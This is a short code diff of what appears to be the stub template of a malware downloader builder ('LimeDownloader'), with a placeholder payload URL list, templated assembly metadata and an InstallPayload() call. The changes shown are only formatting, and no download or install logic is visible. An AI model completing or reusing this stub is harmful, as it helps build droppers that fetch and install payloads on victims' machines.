@@ -7,8 +7,8 @@ using System.Threading;
 using System.Runtime.InteropServices;
 using System.IO;
 using System;
-using Microsoft.Win32;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 [assembly: AssemblyTitle("%Title%")]
 [assembly: AssemblyDescription("%Description%")]
@@ -23,19 +23,15 @@ using System.Diagnostics;
 
 namespace LimeDownloader_Stubnamespace
 {
-
-
     static class Stubclass
     {
-        //vars
       private static List<string> ListURLS = new List<string>(new string[] { "$URL$" });
 
         public static void Main()
         {
-
-#if INS
+            #if INS
             InstallPayload();
-#endif
+            #endif
 
             while (Intrnet() == false)
             {
